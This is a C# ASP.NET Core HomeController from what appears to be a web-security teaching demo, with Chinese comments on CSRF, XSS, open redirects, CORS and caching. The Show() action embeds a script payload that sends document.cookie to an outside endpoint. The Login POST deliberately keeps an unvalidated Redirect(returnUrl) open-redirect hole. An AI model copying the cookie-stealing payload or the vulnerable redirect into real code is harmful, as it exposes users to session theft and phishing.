using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using EasyCaching.Core;
using Microsoft.AspNetCore.Antiforgery;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Caching.Distributed;
using Microsoft.Extensions.Caching.Memory;
using Microsoft.Extensions.Logging;
using Wby.GoodSite.Models;

namespace Wby.GoodSite.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }


        [Authorize]
        [ValidateAntiForgeryToken]
        public IActionResult CreateOrder(string itemId, int count)
        {
            _logger.LogInformation($"创建了订单item:{itemId}, count:{count}");
            return Content("Order Created");
        }

        [HttpGet]
        public IActionResult Login(string returnUrl)
        {
            ViewData["returnUrl"] = returnUrl;
            return View();
        }

        //防跨站脚本攻击演示：假设攻击者已经提交了如下脚本到系统中
        public IActionResult Show()
        {
            //终极解决方案：在实际开发中，应该严格验证用户的输入信息是否有脚本信息，一定要过滤掉脚本标签


            string content = "<p><script>var i=document.createElement('img');" +
                "document.body.appendChild(i);i.src ='https://localhost:5001/home/xss?c=' +" +
                "encodeURIComponent(document.cookie);</script></p>";
            ViewData["content"] = content;

            return View();
        }

        //防开放重定向攻击演示：攻击链接 https://localhost:5003/Home/Login?returnUrl=https%3A%2F%2Flocalhost%3A5001%2FHome%2FLogin
        [HttpPost]
        public async Task<IActionResult> Login([FromServices] IAntiforgery antiforgery, string name, string password, string returnUrl)
        {
            HttpContext.Response.Cookies.Append("CSRF-TOKEN", antiforgery.GetTokens(HttpContext).RequestToken, new Microsoft.AspNetCore.Http.CookieOptions { HttpOnly = false });
            var identity = new ClaimsIdentity(CookieAuthenticationDefaults.AuthenticationScheme);//一定要声明AuthenticationScheme
            identity.AddClaim(new Claim("Name", "小王"));
            await this.HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(identity));
            
            if (string.IsNullOrEmpty(returnUrl))
            {
                return Content("登录成功");
            }
            try
            {
                //这里对returnUrl和数据库或者配置问进行验证比对，验证成功才继续重定向
                var uri = new Uri(returnUrl);
                ///uri.Host
                return Redirect(returnUrl);
            }
            catch
            {
                return Redirect("/");
            }

            //使用LocalRedirect进行重定向，catch error就返回到首页，防开放重定向攻击
            //try
            //{
            //    return LocalRedirect(returnUrl);
            //}
            //catch
            //{
            //    return Redirect("/");
            //}

            //return Redirect(returnUrl);
        }


        [Authorize]
        [HttpPost]
        [EnableCors("api")] //api为设置的跨域策略名称
        public object PostCors(string name)
        {
            //这个方法设置成允许跨域访问
            return new { name = name + DateTime.Now.ToString() };
        }

        #region 缓存
        [ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public OrderModel GetOrder([FromQuery] string query)
        {
            return new OrderModel { Id = 100, Date = DateTime.Now };
        }


        [ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public IActionResult GetAbc([FromQuery] string query)
        {
            return Content("abc" + DateTime.Now);
        }


        //[ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public IActionResult GetMem([FromServices] IMemoryCache cache, [FromQuery] string query)
        {

            var time = cache.GetOrCreate(query ?? "", entry =>
            {
                entry.AbsoluteExpirationRelativeToNow = TimeSpan.FromSeconds(600);
                return DateTime.Now;
            });

            return Content("abc" + time);
        }


        //[ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public IActionResult GetDis([FromServices] IDistributedCache cache, 
            [FromServices] IMemoryCache memoryCache, [FromServices] IEasyCachingProvider easyCaching, [FromQuery] string query)
        {
            #region IDistributedCache
            //var key = $"GetDis-{query ?? ""}";
            //var time = cache.GetString(key);
            //if (string.IsNullOrEmpty(time)) //此处需要考虑并发情形
            //{
            //    var option = new DistributedCacheEntryOptions();
            //    time = DateTime.Now.ToString();
            //    cache.SetString(key, time, new DistributedCacheEntryOptions { AbsoluteExpirationRelativeToNow = TimeSpan.FromSeconds(600) });
            //}
            #endregion

            #region IEasyCachingProvider
            var key = $"GetDis-{query ?? ""}";
            var time = easyCaching.Get(key, () => DateTime.Now.ToString(), TimeSpan.FromSeconds(600));
            #endregion

            return Content("abc" + time);
        }
        #endregion
    }
}
